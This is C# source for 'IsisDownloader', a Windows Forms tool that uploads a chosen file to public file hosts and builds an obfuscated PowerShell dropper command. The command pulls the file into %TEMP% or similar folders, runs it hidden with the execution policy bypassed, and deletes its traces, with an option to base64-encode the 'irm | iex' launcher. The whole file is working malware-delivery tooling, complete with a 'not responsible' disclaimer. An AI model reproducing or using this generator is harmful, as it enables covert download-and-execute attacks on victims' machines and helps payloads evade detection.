using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Isis
{
    public partial class IsisDownloader : Form
    {
        private string selectedFilePath = "";
        private List<(string Command, string Timestamp)> codeHistory = new List<(string, string)>();

        private Panel topBarPanel;
        private PictureBox picLogo;
        private Label lblTitle;
        private Button btnLogout;

        private Panel navBarPanel;
        private Button btnTabHome;
        private Button btnTabHistory;
        private Button btnTabAbout;

        private Panel homePanel;
        private Panel historyPanel;
        private Panel aboutPanel;

        private Label lblSelectedFileTitle;
        private TextBox txtFilePath;
        private Button btnBrowse;
        private Button btnGenerate;

        private CheckBox chkObfuscation;
        private CheckBox chkHidden;
        private CheckBox chkDropper;
        private CheckBox chkDeleteAfter;

        private Label lblDropLocation;
        private ComboBox cmbDropLocation;

        private Label lblHistoryTitle;
        private Button btnSaveTxt;
        private FlowLayoutPanel historyFlowPanel;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        public IsisDownloader()
        {
            InitializeComponentCustom();
            SwitchTab(homePanel, btnTabHome);
        }

        private void InitializeComponentCustom()
        {
            this.Text = "IsisDownloader";
            this.Size = new Size(740, 560);
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.Black;
            this.ForeColor = Color.White;
            this.DoubleBuffered = true;
            this.Opacity = 0.92;

            try
            {
                string iconPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "mainico.png");
                if (File.Exists(iconPath))
                {
                    using (var bmp = new Bitmap(iconPath))
                    {
                        this.Icon = Icon.FromHandle(bmp.GetHicon());
                    }
                }
            }
            catch { }

            topBarPanel = new Panel();
            topBarPanel.Dock = DockStyle.Top;
            topBarPanel.Height = 36;
            topBarPanel.BackColor = Color.Black;
            topBarPanel.MouseDown += TopBarPanel_MouseDown;

            picLogo = new PictureBox();
            picLogo.Size = new Size(24, 24);
            picLogo.Location = new Point(10, 6);
            picLogo.SizeMode = PictureBoxSizeMode.Zoom;
            try
            {
                string logoPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "isis.png");
                if (File.Exists(logoPath))
                {
                    picLogo.Image = Image.FromFile(logoPath);
                }
            }
            catch { }
            picLogo.MouseDown += TopBarPanel_MouseDown;

            lblTitle = new Label();
            lblTitle.Text = "IsisDownloader";
            lblTitle.ForeColor = Color.FromArgb(240, 240, 240);
            lblTitle.Font = new Font("Segoe UI", 10F, FontStyle.Bold);
            lblTitle.Location = new Point(42, 8);
            lblTitle.AutoSize = true;
            lblTitle.MouseDown += TopBarPanel_MouseDown;

            btnLogout = new Button();
            btnLogout.Size = new Size(42, 36);
            btnLogout.Dock = DockStyle.Right;
            btnLogout.FlatStyle = FlatStyle.Flat;
            btnLogout.FlatAppearance.BorderSize = 0;
            btnLogout.BackColor = Color.Black;
            btnLogout.Cursor = Cursors.Hand;
            try
            {
                string logoutPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "logout.png");
                if (File.Exists(logoutPath))
                {
                    Image img = Image.FromFile(logoutPath);
                    Bitmap bmp = new Bitmap(img, new Size(16, 16));
                    btnLogout.Image = bmp;
                    btnLogout.ImageAlign = ContentAlignment.MiddleCenter;
                }
            }
            catch { }
            btnLogout.Click += (s, e) => Application.Exit();
            btnLogout.MouseEnter += (s, e) => btnLogout.BackColor = Color.FromArgb(180, 30, 30);
            btnLogout.MouseLeave += (s, e) => btnLogout.BackColor = Color.Black;

            topBarPanel.Controls.Add(picLogo);
            topBarPanel.Controls.Add(lblTitle);
            topBarPanel.Controls.Add(btnLogout);
            this.Controls.Add(topBarPanel);

            navBarPanel = new Panel();
            navBarPanel.Dock = DockStyle.Bottom;
            navBarPanel.Height = 45;
            navBarPanel.BackColor = Color.Black;

            int tabWidth = 740 / 3;
            btnTabHome = CreateTabButton("home.png", 0, tabWidth);
            btnTabHistory = CreateTabButton("history.png", tabWidth, tabWidth);
            btnTabAbout = CreateTabButton("info.png", tabWidth * 2, tabWidth);

            btnTabHome.Click += (s, e) => SwitchTab(homePanel, btnTabHome);
            btnTabHistory.Click += (s, e) => SwitchTab(historyPanel, btnTabHistory);
            btnTabAbout.Click += (s, e) => SwitchTab(aboutPanel, btnTabAbout);

            navBarPanel.Controls.Add(btnTabHome);
            navBarPanel.Controls.Add(btnTabHistory);
            navBarPanel.Controls.Add(btnTabAbout);
            this.Controls.Add(navBarPanel);

            homePanel = CreateContentPanel();
            historyPanel = CreateContentPanel();
            aboutPanel = CreateContentPanel();

            BuildHomePanel();
            BuildHistoryPanel();
            BuildAboutPanel();

            this.Controls.Add(homePanel);
            this.Controls.Add(historyPanel);
            this.Controls.Add(aboutPanel);
        }

        private Button CreateTabButton(string imageName, int x, int width)
        {
            Button btn = new Button();
            btn.Size = new Size(width, 45);
            btn.Location = new Point(x, 0);
            btn.FlatStyle = FlatStyle.Flat;
            btn.FlatAppearance.BorderSize = 0;
            btn.BackColor = Color.Black;
            btn.Cursor = Cursors.Hand;

            try
            {
                string imgPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", imageName);
                if (File.Exists(imgPath))
                {
                    Image img = Image.FromFile(imgPath);
                    Bitmap bmp = new Bitmap(img, new Size(24, 24));
                    btn.Image = bmp;
                    btn.ImageAlign = ContentAlignment.MiddleCenter;
                }
            }
            catch { }

            btn.MouseEnter += (s, e) => { if (btn.BackColor != Color.FromArgb(20, 20, 20)) btn.BackColor = Color.FromArgb(15, 15, 15); };
            btn.MouseLeave += (s, e) => { if (btn.BackColor != Color.FromArgb(20, 20, 20)) btn.BackColor = Color.Black; };
            return btn;
        }

        private Panel CreateContentPanel()
        {
            Panel p = new Panel();
            p.Dock = DockStyle.Fill;
            p.Padding = new Padding(30, 20, 30, 20);
            p.BackColor = Color.Black;
            p.Visible = false;
            return p;
        }

        private void SwitchTab(Panel activePanel, Button activeBtn)
        {
            homePanel.Visible = false;
            historyPanel.Visible = false;
            aboutPanel.Visible = false;

            btnTabHome.BackColor = Color.Black;
            btnTabHistory.BackColor = Color.Black;
            btnTabAbout.BackColor = Color.Black;

            activePanel.Visible = true;
            activeBtn.BackColor = Color.FromArgb(20, 20, 20);
        }

        private void BuildHomePanel()
        {
            int startX = 30;
            int startY = 40;

            lblSelectedFileTitle = new Label();
            lblSelectedFileTitle.Text = "Selected file:";
            lblSelectedFileTitle.Font = new Font("Segoe UI", 10F, FontStyle.Bold);
            lblSelectedFileTitle.ForeColor = Color.FromArgb(200, 200, 200);
            lblSelectedFileTitle.Size = new Size(660, 22);
            lblSelectedFileTitle.Location = new Point(startX, startY);
            lblSelectedFileTitle.TextAlign = ContentAlignment.MiddleCenter;

            txtFilePath = new TextBox();
            txtFilePath.Text = "Enter file name";
            txtFilePath.Font = new Font("Segoe UI", 10.5F, FontStyle.Regular);
            txtFilePath.ForeColor = Color.FromArgb(120, 120, 120);
            txtFilePath.BackColor = Color.FromArgb(10, 10, 10);
            txtFilePath.BorderStyle = BorderStyle.FixedSingle;
            txtFilePath.Size = new Size(660, 36);
            txtFilePath.Location = new Point(startX, startY + 28);
            txtFilePath.ReadOnly = true;
            txtFilePath.TextAlign = HorizontalAlignment.Center;

            btnBrowse = new Button();
            btnBrowse.Text = "Browse File...";
            btnBrowse.Font = new Font("Segoe UI", 10F, FontStyle.Bold);
            btnBrowse.Size = new Size(660, 42);
            btnBrowse.Location = new Point(startX, startY + 72);
            btnBrowse.FlatStyle = FlatStyle.Flat;
            btnBrowse.FlatAppearance.BorderColor = Color.FromArgb(40, 40, 40);
            btnBrowse.BackColor = Color.FromArgb(12, 12, 12);
            btnBrowse.ForeColor = Color.White;
            btnBrowse.Cursor = Cursors.Hand;
            btnBrowse.TextAlign = ContentAlignment.MiddleCenter;
            btnBrowse.Click += BtnBrowse_Click;
            btnBrowse.MouseEnter += (s, e) => btnBrowse.BackColor = Color.FromArgb(25, 25, 25);
            btnBrowse.MouseLeave += (s, e) => btnBrowse.BackColor = Color.FromArgb(12, 12, 12);


            Panel pnlOptions = new Panel();
            pnlOptions.Location = new Point(startX, startY + 124);
            pnlOptions.Size = new Size(660, 155);
            pnlOptions.BackColor = Color.FromArgb(10, 10, 10);
            pnlOptions.BorderStyle = BorderStyle.FixedSingle;

            Label lblOptionsTitle = new Label();
            lblOptionsTitle.UseMnemonic = false;
            lblOptionsTitle.Text = " oPtIoNs:";
            lblOptionsTitle.Font = new Font("Segoe UI", 10F, FontStyle.Bold);
            lblOptionsTitle.ForeColor = Color.FromArgb(200, 200, 200);
            lblOptionsTitle.Size = new Size(658, 25);
            lblOptionsTitle.Location = new Point(1, 10);
            lblOptionsTitle.TextAlign = ContentAlignment.MiddleCenter;

            chkObfuscation = CreateCheckBox("Obfuscation", new Point(60, 42));
            chkHidden = CreateCheckBox("Hidden", new Point(60, 75));

            chkDropper = CreateCheckBox("Dropper", new Point(360, 42));
            chkDeleteAfter = CreateCheckBox("Delete After", new Point(360, 75));

            lblDropLocation = new Label();
            lblDropLocation.UseMnemonic = false;
            lblDropLocation.Text = "Drop Location:";
            lblDropLocation.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
            lblDropLocation.ForeColor = Color.FromArgb(180, 180, 180);
            lblDropLocation.Location = new Point(360, 102);
            lblDropLocation.AutoSize = true;

            cmbDropLocation = new ComboBox();
            cmbDropLocation.DropDownStyle = ComboBoxStyle.DropDownList;
            cmbDropLocation.Font = new Font("Segoe UI", 9F, FontStyle.Regular);
            cmbDropLocation.BackColor = Color.FromArgb(18, 18, 18);
            cmbDropLocation.ForeColor = Color.White;
            cmbDropLocation.FlatStyle = FlatStyle.Flat;
            cmbDropLocation.Size = new Size(270, 28);
            cmbDropLocation.Location = new Point(360, 120);
            cmbDropLocation.Items.AddRange(new object[] {
                "(%TEMP%)",
                "(%APPDATA%)",
                "(%LOCALAPPDATA%)",
                "(%PUBLIC%)",
                "(%USERPROFILE%)",
                "(%ProgramData%)"
            });
            cmbDropLocation.SelectedIndex = 0;

            pnlOptions.Controls.Add(lblOptionsTitle);
            pnlOptions.Controls.Add(chkObfuscation);
            pnlOptions.Controls.Add(chkHidden);
            pnlOptions.Controls.Add(chkDropper);
            pnlOptions.Controls.Add(chkDeleteAfter);
            pnlOptions.Controls.Add(lblDropLocation);
            pnlOptions.Controls.Add(cmbDropLocation);

            btnGenerate = new Button();
            btnGenerate.Text = "Generate Command";
            btnGenerate.Font = new Font("Segoe UI", 11F, FontStyle.Bold);
            btnGenerate.Size = new Size(660, 50);
            btnGenerate.Location = new Point(startX, startY + 289);
            btnGenerate.FlatStyle = FlatStyle.Flat;
            btnGenerate.FlatAppearance.BorderColor = Color.FromArgb(50, 50, 50);
            btnGenerate.BackColor = Color.FromArgb(18, 18, 18);
            btnGenerate.ForeColor = Color.White;
            btnGenerate.Cursor = Cursors.Hand;
            btnGenerate.TextAlign = ContentAlignment.MiddleCenter;
            btnGenerate.Enabled = false;
            btnGenerate.Click += BtnGenerate_Click;
            btnGenerate.MouseEnter += (s, e) => { if (btnGenerate.Enabled) btnGenerate.BackColor = Color.FromArgb(35, 35, 35); };
            btnGenerate.MouseLeave += (s, e) => { if (btnGenerate.Enabled) btnGenerate.BackColor = Color.FromArgb(18, 18, 18); };

            homePanel.Controls.Add(lblSelectedFileTitle);
            homePanel.Controls.Add(txtFilePath);
            homePanel.Controls.Add(btnBrowse);
            homePanel.Controls.Add(pnlOptions);
            homePanel.Controls.Add(btnGenerate);
        }

        private CheckBox CreateCheckBox(string text, Point location)
        {
            CheckBox chk = new CheckBox();
            chk.Text = text;
            chk.Font = new Font("Segoe UI", 9.5F, FontStyle.Regular);
            chk.ForeColor = Color.FromArgb(220, 220, 220);
            chk.BackColor = Color.Transparent;
            chk.Location = location;
            chk.AutoSize = true;
            chk.Cursor = Cursors.Hand;
            return chk;
        }

        private void BuildHistoryPanel()
        {
            lblHistoryTitle = new Label();
            lblHistoryTitle.Text = "Generated codes history";
            lblHistoryTitle.Font = new Font("Segoe UI", 12F, FontStyle.Bold);
            lblHistoryTitle.ForeColor = Color.FromArgb(240, 240, 240);
            lblHistoryTitle.Location = new Point(30, 45);
            lblHistoryTitle.AutoSize = true;

            btnSaveTxt = new Button();
            btnSaveTxt.Text = "Save as .txt";
            btnSaveTxt.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
            btnSaveTxt.Size = new Size(130, 32);
            btnSaveTxt.Location = new Point(560, 42);
            btnSaveTxt.FlatStyle = FlatStyle.Flat;
            btnSaveTxt.FlatAppearance.BorderColor = Color.FromArgb(40, 40, 40);
            btnSaveTxt.BackColor = Color.FromArgb(15, 15, 15);
            btnSaveTxt.ForeColor = Color.White;
            btnSaveTxt.Cursor = Cursors.Hand;
            btnSaveTxt.Click += BtnSaveTxt_Click;

            historyFlowPanel = new FlowLayoutPanel();
            historyFlowPanel.Location = new Point(30, 95);
            historyFlowPanel.Size = new Size(660, 270);
            historyFlowPanel.FlowDirection = FlowDirection.TopDown;
            historyFlowPanel.AutoScroll = true;
            historyFlowPanel.WrapContents = false;
            historyFlowPanel.BackColor = Color.Black;

            historyPanel.Controls.Add(lblHistoryTitle);
            historyPanel.Controls.Add(btnSaveTxt);
            historyPanel.Controls.Add(historyFlowPanel);
        }

        private void BuildAboutPanel()
        {
            int startY = 30;

            Label lblDisclaimer = new Label();
            lblDisclaimer.Text = "!!! Disclaimer";
            lblDisclaimer.Font = new Font("Segoe UI", 14F, FontStyle.Bold);
            lblDisclaimer.ForeColor = Color.White;
            lblDisclaimer.Size = new Size(680, 35);
            lblDisclaimer.Location = new Point(30, startY);
            lblDisclaimer.TextAlign = ContentAlignment.MiddleCenter;

            Label lblWarning = new Label();
            lblWarning.Text = "I am not responsible for your actions.\n2026 Nubersec Group. All Rights Reserved.";
            lblWarning.Font = new Font("Segoe UI", 10F, FontStyle.Regular);
            lblWarning.ForeColor = Color.White;
            lblWarning.Size = new Size(680, 50);
            lblWarning.Location = new Point(30, startY + 38);
            lblWarning.TextAlign = ContentAlignment.MiddleCenter;

            int colY = startY + 105;

            Label lblDesHead = new Label();
            lblDesHead.Text = "DESIGNER";
            lblDesHead.Font = new Font("Segoe UI", 8.5F, FontStyle.Bold);
            lblDesHead.ForeColor = Color.FromArgb(130, 130, 130);
            lblDesHead.Location = new Point(70, colY);
            lblDesHead.AutoSize = true;

            Label lblDesName = new Label();
            lblDesName.Text = "A3t8al";
            lblDesName.Font = new Font("Segoe UI", 11F, FontStyle.Bold);
            lblDesName.ForeColor = Color.White;
            lblDesName.Location = new Point(70, colY + 22);
            lblDesName.AutoSize = true;

            Label lblDevHead = new Label();
            lblDevHead.Text = "DEVELOPER";
            lblDevHead.Font = new Font("Segoe UI", 8.5F, FontStyle.Bold);
            lblDevHead.ForeColor = Color.FromArgb(130, 130, 130);
            lblDevHead.Location = new Point(310, colY);
            lblDevHead.AutoSize = true;

            Label lblDevName = new Label();
            lblDevName.Text = "Mkaf7h";
            lblDevName.Font = new Font("Segoe UI", 11F, FontStyle.Bold);
            lblDevName.ForeColor = Color.White;
            lblDevName.Location = new Point(310, colY + 22);
            lblDevName.AutoSize = true;

            Label lblPartHead = new Label();
            lblPartHead.Text = "A PARTNER";
            lblPartHead.Font = new Font("Segoe UI", 8.5F, FontStyle.Bold);
            lblPartHead.ForeColor = Color.FromArgb(130, 130, 130);
            lblPartHead.Location = new Point(530, colY);
            lblPartHead.AutoSize = true;

            Label lblPartName = new Label();
            lblPartName.Text = "Mugy";
            lblPartName.Font = new Font("Segoe UI", 11F, FontStyle.Bold);
            lblPartName.ForeColor = Color.White;
            lblPartName.Location = new Point(530, colY + 22);
            lblPartName.AutoSize = true;

            int btnY = colY + 80;
            int btnW = 190;
            int btnH = 38;

            Button btnDiscord = CreateAboutButton("DISCORD", 45, btnY, btnW, btnH);
            Button btnTellonym = CreateAboutButton("TELLONYM", 265, btnY, btnW, btnH);
            Button btnGithub = CreateAboutButton("GITHUB", 485, btnY, btnW, btnH);

            btnDiscord.Click += (s, e) => OpenUrl("https://discord.gg/z4y");
            btnTellonym.Click += (s, e) => OpenUrl("https://tellonym.me/xugex");
            btnGithub.Click += (s, e) => OpenUrl("https://github.com/Mkaf7h");

            aboutPanel.Controls.Add(lblDisclaimer);
            aboutPanel.Controls.Add(lblWarning);
            aboutPanel.Controls.Add(lblDesHead);
            aboutPanel.Controls.Add(lblDesName);
            aboutPanel.Controls.Add(lblDevHead);
            aboutPanel.Controls.Add(lblDevName);
            aboutPanel.Controls.Add(lblPartHead);
            aboutPanel.Controls.Add(lblPartName);
            aboutPanel.Controls.Add(btnDiscord);
            aboutPanel.Controls.Add(btnTellonym);
            aboutPanel.Controls.Add(btnGithub);
        }

        private Button CreateAboutButton(string text, int x, int y, int w, int h)
        {
            Button btn = new Button();
            btn.Text = text;
            btn.Font = new Font("Segoe UI", 9.5F, FontStyle.Bold);
            btn.Size = new Size(w, h);
            btn.Location = new Point(x, y);
            btn.FlatStyle = FlatStyle.Flat;
            btn.FlatAppearance.BorderColor = Color.FromArgb(60, 60, 60);
            btn.BackColor = Color.FromArgb(15, 15, 15);
            btn.ForeColor = Color.White;
            btn.Cursor = Cursors.Hand;
            btn.MouseEnter += (s, e) => btn.BackColor = Color.FromArgb(30, 30, 30);
            btn.MouseLeave += (s, e) => btn.BackColor = Color.FromArgb(15, 15, 15);
            return btn;
        }

        private void OpenUrl(string url)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Failed to open link: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void TopBarPanel_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofn = new OpenFileDialog())
            {
                ofn.Title = "Select File to Upload";
                ofn.Filter = "All Files (*.*)|*.*";
                if (ofn.ShowDialog() == DialogResult.OK)
                {
                    selectedFilePath = ofn.FileName;
                    txtFilePath.Text = selectedFilePath;
                    txtFilePath.ForeColor = Color.White;
                    btnGenerate.Enabled = true;
                }
            }
        }

        private async void BtnGenerate_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(selectedFilePath) || !File.Exists(selectedFilePath))
            {
                MessageBox.Show(this, "File does not exist!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            btnGenerate.Enabled = false;
            btnGenerate.Text = "please wait (uploading)...";

            try
            {
                string finalCommand = await HandleUploadWorkflowAsync(selectedFilePath);

                if (!string.IsNullOrEmpty(finalCommand))
                {
                    Clipboard.SetText(finalCommand);

                    string dt = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    codeHistory.Add((finalCommand, dt));
                    RefreshHistoryUI();

                    btnGenerate.Text = "Successfully generated & Copied!";
                    btnGenerate.ForeColor = Color.FromArgb(100, 255, 100);

                    MessageBox.Show(
                        this,
                        "Command generated successfully and copied to clipboard!\n\n" + finalCommand,
                        "Success - IsisDownloader v3.2",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information
                    );

                    await Task.Delay(1500);
                    btnGenerate.Text = "Generate Command";
                    btnGenerate.ForeColor = Color.White;
                }
                else
                {
                    MessageBox.Show(this, "Failed to generate.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    btnGenerate.Text = "Generate Command";
                }
            }
            catch (Exception ex)
            {
                btnGenerate.Text = "Generate Command";
                MessageBox.Show(this, "Upload Error Details:\n" + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnGenerate.Enabled = true;
            }
        }

        private async Task<string> HandleUploadWorkflowAsync(string filePath)
        {
            try
            {
                string fileUrl = await UploadToCatboxAsync(filePath);
                if (string.IsNullOrEmpty(fileUrl)) return "";

                string originalFilename = Path.GetFileName(filePath);
                string randomName = GenerateRandomFilename(".bat");
                string fileUrlNoHttps = RemoveHttps(fileUrl);

                StringBuilder psBuilder = new StringBuilder();

                string targetDirVar;
                switch (cmbDropLocation.SelectedIndex)
                {
                    case 1:
                        targetDirVar = "$env:APPDATA";
                        break;
                    case 2:
                        targetDirVar = "$env:LOCALAPPDATA";
                        break;
                    case 3:
                        targetDirVar = "$env:PUBLIC";
                        break;
                    case 4:
                        targetDirVar = "$env:USERPROFILE";
                        break;
                    case 5:
                        targetDirVar = "$env:ProgramData";
                        break;
                    case 0:
                    default:
                        targetDirVar = "$env:TEMP";
                        break;
                }

                if (chkDropper.Checked)
                {
                    string randomFolder = GenerateRandomFilename("");
                    psBuilder.AppendLine($"$dropDir = Join-Path {targetDirVar} '{randomFolder}'");
                    psBuilder.AppendLine("if (!(Test-Path $dropDir)) { New-Item -ItemType Directory -Path $dropDir -Force | Out-Null }");
                    psBuilder.AppendLine($"$tempFile = Join-Path $dropDir '{originalFilename}'");
                }
                else
                {
                    psBuilder.AppendLine($"$tempFile = Join-Path {targetDirVar} '{originalFilename}'");
                }

                psBuilder.AppendLine($"$url = '{fileUrlNoHttps}'");
                psBuilder.AppendLine("Invoke-WebRequest -Uri $url -OutFile $tempFile");

                if (chkHidden.Checked)
                {
                    psBuilder.AppendLine("Set-ItemProperty -Path $tempFile -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue");
                    psBuilder.AppendLine("Start-Process -FilePath $tempFile -WindowStyle Hidden -Wait");
                }
                else
                {
                    psBuilder.AppendLine("Start-Process -FilePath $tempFile -Wait");
                }

                if (chkDeleteAfter.Checked)
                {
                    psBuilder.AppendLine("Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue");
                    if (chkDropper.Checked)
                    {
                        psBuilder.AppendLine("Remove-Item -Path $dropDir -Recurse -Force -ErrorAction SilentlyContinue");
                    }
                }

                string psScript = psBuilder.ToString();

                if (chkObfuscation.Checked)
                {
                    psScript = ObfuscatePowerShellScript(psScript);
                }

                string psFilePath = Path.Combine(Path.GetTempPath(), "download_" + randomName + ".ps1");
                File.WriteAllText(psFilePath, psScript, new UTF8Encoding(false));

                string psFileUrl = await UploadToCatboxAsync(psFilePath);
                try { File.Delete(psFilePath); } catch { }

                if (string.IsNullOrEmpty(psFileUrl)) return "";

                string psFileUrlNoHttps = RemoveHttps(psFileUrl);

                string flags = "-NoP -NonI -ExecutionPolicy Bypass";
                if (chkHidden.Checked)
                {
                    flags = "-WindowStyle Hidden " + flags;
                }

                string finalCommand;
                if (chkObfuscation.Checked)
                {
                    string launcherCode = $"irm {psFileUrlNoHttps} | iex";
                    string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(launcherCode));
                    finalCommand = $"powershell {flags} -EncodedCommand {encoded}";
                }
                else
                {
                    finalCommand = $"powershell {flags} \"irm {psFileUrlNoHttps} | iex\"";
                }

                return finalCommand;
            }
            catch (Exception ex)
            {
                throw new Exception("Workflow failed: " + ex.Message);
            }
        }

        private string ObfuscatePowerShellScript(string script)
        {
            return script
                .Replace("Invoke-WebRequest", "I`n`v`o`k`e`-`W`e`b`R`e`q`u`e`s`t")
                .Replace("Start-Process", "S`t`a`r`t`-`P`r`o`c`e`s`s")
                .Replace("Remove-Item", "R`e`m`o`v`e`-`I`t`e`m")
                .Replace("New-Item", "N`e`w`-`I`t`e`m")
                .Replace("Test-Path", "T`e`s`t`-`P`a`t`h");
        }

        private async Task<string> UploadToCatboxAsync(string path)
        {
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
                    string lastError = "";

                    try
                    {
                        using (var form = new MultipartFormDataContent())
                        {
                            var reqtypeContent = new ByteArrayContent(Encoding.UTF8.GetBytes("fileupload"));
                            reqtypeContent.Headers.ContentType = null;
                            form.Add(reqtypeContent, "reqtype");

                            var fileBytes = File.ReadAllBytes(path);
                            var fileContent = new ByteArrayContent(fileBytes);
                            fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/octet-stream");
                            form.Add(fileContent, "fileToUpload", Path.GetFileName(path));

                            var response = await client.PostAsync("https://catbox.moe/user/api.php", form);
                            if (response.IsSuccessStatusCode)
                            {
                                string res = (await response.Content.ReadAsStringAsync()).Trim();
                                if (!string.IsNullOrEmpty(res) && res.StartsWith("http")) return res;
                            }
                            else
                            {
                                string errText = await response.Content.ReadAsStringAsync();
                                lastError = $"Catbox API failed (Status {(int)response.StatusCode}: {errText})";
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        lastError = $"Catbox error: {ex.Message}";
                    }

                    try
                    {
                        using (var form = new MultipartFormDataContent())
                        {
                            var reqtypeContent = new ByteArrayContent(Encoding.UTF8.GetBytes("fileupload"));
                            reqtypeContent.Headers.ContentType = null;
                            form.Add(reqtypeContent, "reqtype");

                            var timeContent = new ByteArrayContent(Encoding.UTF8.GetBytes("72h"));
                            timeContent.Headers.ContentType = null;
                            form.Add(timeContent, "time");

                            var fileBytes = File.ReadAllBytes(path);
                            var fileContent = new ByteArrayContent(fileBytes);
                            fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/octet-stream");
                            form.Add(fileContent, "fileToUpload", Path.GetFileName(path));

                            var response = await client.PostAsync("https://litterbox.catbox.moe/resources/api.php", form);
                            if (response.IsSuccessStatusCode)
                            {
                                string res = (await response.Content.ReadAsStringAsync()).Trim();
                                if (!string.IsNullOrEmpty(res) && res.StartsWith("http")) return res;
                            }
                            else
                            {
                                string errText = await response.Content.ReadAsStringAsync();
                                lastError += $" | Litterbox failed (Status {(int)response.StatusCode}: {errText})";
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        lastError += $" | Litterbox error: {ex.Message}";
                    }

                    try
                    {
                        using (var form = new MultipartFormDataContent())
                        {
                            var fileBytes = File.ReadAllBytes(path);
                            var fileContent = new ByteArrayContent(fileBytes);
                            fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/octet-stream");
                            form.Add(fileContent, "file", Path.GetFileName(path));

                            var response = await client.PostAsync("https://tmpfiles.org/api/v1/upload", form);
                            if (response.IsSuccessStatusCode)
                            {
                                string resJson = await response.Content.ReadAsStringAsync();
                                int urlIdx = resJson.IndexOf("\"url\":\"");
                                if (urlIdx != -1)
                                {
                                    int start = urlIdx + 7;
                                    int end = resJson.IndexOf("\"", start);
                                    if (end != -1)
                                    {
                                        string rawUrl = resJson.Substring(start, end - start).Replace("\\/", "/");
                                        string dlUrl = rawUrl.Replace("tmpfiles.org/", "tmpfiles.org/dl/");
                                        if (dlUrl.StartsWith("http")) return dlUrl;
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        lastError += $" | Tmpfiles error: {ex.Message}";
                    }

                    throw new Exception($"All upload APIs failed.\nDetails: {lastError}\n\nPlease check your internet connection, VPN, or DNS settings.");
                }
            }
        }

        private string RemoveHttps(string url)
        {
            if (url.StartsWith("https://"))
                return url.Substring(8);
            return url;
        }

        private string GenerateRandomFilename(string ext)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            var rnd = new Random();
            var sb = new StringBuilder();
            for (int i = 0; i < 8; i++)
            {
                sb.Append(chars[rnd.Next(chars.Length)]);
            }
            return sb.ToString() + ext;
        }

        private void RefreshHistoryUI()
        {
            historyFlowPanel.Controls.Clear();

            for (int i = 0; i < codeHistory.Count; i++)
            {
                var item = codeHistory[i];
                Panel rowPanel = new Panel();
                rowPanel.Size = new Size(620, 35);
                rowPanel.BackColor = Color.FromArgb(10, 10, 10);
                rowPanel.Margin = new Padding(0, 0, 0, 5);

                Label lblTime = new Label();
                lblTime.Text = $"[{item.Timestamp}]";
                lblTime.ForeColor = Color.White;
                lblTime.Font = new Font("Segoe UI", 9F, FontStyle.Bold);
                lblTime.Location = new Point(5, 8);
                lblTime.AutoSize = true;

                Label lblCmd = new Label();
                lblCmd.Text = item.Command;
                lblCmd.ForeColor = Color.White;
                lblCmd.Font = new Font("Segoe UI", 9F, FontStyle.Regular);
                lblCmd.Location = new Point(155, 8);
                lblCmd.Size = new Size(350, 20);
                lblCmd.AutoEllipsis = true;

                Button btnCopy = new Button();
                btnCopy.Text = "Copy";
                btnCopy.Size = new Size(70, 26);
                btnCopy.Location = new Point(535, 4);
                btnCopy.FlatStyle = FlatStyle.Flat;
                btnCopy.FlatAppearance.BorderColor = Color.FromArgb(50, 50, 50);
                btnCopy.BackColor = Color.FromArgb(20, 20, 20);
                btnCopy.ForeColor = Color.White;
                btnCopy.Cursor = Cursors.Hand;
                int index = i;
                btnCopy.Click += (s, e) =>
                {
                    Clipboard.SetText(codeHistory[index].Command);
                    btnCopy.Text = "Copied!";
                    Task.Delay(1000).ContinueWith(_ => {
                        if (btnCopy.IsHandleCreated)
                            btnCopy.Invoke(new Action(() => btnCopy.Text = "Copy"));
                    });
                };

                rowPanel.Controls.Add(lblTime);
                rowPanel.Controls.Add(lblCmd);
                rowPanel.Controls.Add(btnCopy);
                historyFlowPanel.Controls.Add(rowPanel);
            }
        }

